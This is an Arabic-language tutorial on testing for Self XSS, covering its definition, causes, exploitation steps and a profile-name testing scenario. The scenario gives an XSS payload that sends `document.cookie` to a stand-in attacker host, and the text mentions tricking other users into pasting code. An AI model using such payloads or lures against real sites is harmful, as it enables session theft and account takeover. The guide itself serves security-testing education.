
## فهم الخطوة: اختبار ثغرة Self XSS

### ما المقصود؟
ال**Self XSS** هي نوع من ثغرات Cross-Site Scripting (XSS) حيث يقوم المستخدم بحقن شيفرة JavaScript ضارة في نقطة إدخال يتحكم بها (مثل حقل نموذج، معلمة URL، أو واجهة إدخال في التطبيق)، وتُنفذ الشيفرة في متصفحه الخاص دون التأثير على مستخدمين آخرين. تُعتبر هذه الثغرة محدودة التأثير لأنها لا تُخزن في قاعدة البيانات (مثل Stored XSS) ولا تُنقل عبر الخادم لتؤثر على الآخرين (مثل Reflected XSS). غالبًا ما تحدث في سياقات مثل:
- حقول إدخال تُعالج بـ JavaScript في جانب العميل (Client-Side) وتُعرض مباشرة في DOM.
- معلمات URL أو أجزاء منها (مثل `location.hash`) تُستخدم ديناميكيًا في الصفحة.
- واجهات تحرير المحتوى أو الإعدادات الشخصية التي تعرض الإدخالات دون تنظيف كافٍ.
الهدف من اختبار Self XSS هو تحديد نقاط الإدخال التي تسمح بتنفيذ JavaScript في متصفح المستخدم، مع تقييم إمكانية تصعيد الثغرة إلى هجمات أكثر خطورة (مثل دمجها مع هجمات هندسة اجتماعية أو ثغرات أخرى).

### لماذا يعمل؟
- **معالجة الإدخالات في العميل**: التطبيقات التي تُعالج إدخالات المستخدم مباشرة في JavaScript (مثل `innerHTML`، `eval()`، أو `document.write()`) دون تنظيف تسمح بتنفيذ الشيفرة.
- **عدم التحقق من الإدخال**: عدم وجود فلاتر أو تشفير للإدخالات في DOM يؤدي إلى تنفيذ JavaScript.
- **دعم المتصفحات**: المتصفحات تُنفذ JavaScript تلقائيًا عند إدراجه في وسوم (`<script>`، `<img>`)، أحداث (`onerror`، `onload`)، أو بروتوكولات (`javascript:`).
- **التفاعل المباشر**: Self XSS تعتمد على إدخال المستخدم الخاص، مما يجعلها غير مرصودة من الفلاتر الخاصة بالخادم.
- **إمكانية التصعيد**: على الرغم من محدوديتها، يمكن استغلال Self XSS في هجمات هندسة اجتماعية (مثل إقناع المستخدم بإدخال شيفرة ضارة) أو دمجها مع ثغرات أخرى (مثل CSRF).

### كيف يتم الاستغلال؟
- يقوم المستخدم (أو المهاجم في سياق اختبار الأمان) بإدخال شيفرة JavaScript في نقطة إدخال مثل حقل نموذج، معلمة URL، أو إعدادات المستخدم.
- تُصمم الحقنة لتنفيذ شيفرة في متصفح المستخدم عند عرض الإدخال، إما تلقائيًا (مثل `<script>`) أو عند التفاعل (مثل `onclick`).
- تُستخدم الشيفرة لأغراض اختبار مثل:
  - تنفيذ تنبيه لتأكيد الثغرة (`alert('XSS')`).
  - استخراج بيانات حساسة مثل `document.cookie` أو `localStorage`.
  - التلاعب بمحتوى الصفحة أو إعادة التوجيه.
- يتم مراقبة استجابة المتصفح (مثل Console، الشبكة، أو DOM) لتأكيد التنفيذ:
  - **نجاح (True)**: الشيفرة تُنفذ (مثل ظهور تنبيه أو إرسال بيانات إلى خادم خارجي).
  - **فشل (False)**: لا يتم التنفيذ بسبب فلاتر، تشفير، أو قيود CSP.
- قد يُستخدم المهاجم هجمات هندسة اجتماعية لإقناع المستخدم بإدخال الشيفرة (مثل عبر تعليمات مضللة في منتدى).

### السناريو
لنفترض أنك تختبر موقعًا إلكترونيًا يحتوي على حقل لتحرير الاسم في صفحة الملف الشخصي. لاحظت أن إدخال `<script>alert('XSS')</script>` في حقل الاسم يؤدي إلى ظهور تنبيه عند عرض الاسم في الصفحة، ولكن هذا يؤثر عليك فقط (وليس على مستخدمين آخرين). تريد الآن اختبار إمكانية تنفيذ شيفرة مثل `<img src=x onerror=fetch('http://attacker.com/log?c='+document.cookie)>` لاستخراج ملفات تعريف الارتباط. إذا تلقى خادمك البيانات أو نُفذت الشيفرة، فهذا يؤكد وجود ثغرة Self XSS. قد تحاول أيضًا تصعيد الثغرة بإقناع مستخدم آخر بإدخال شيفرة مماثلة عبر تعليمات مضللة.

---
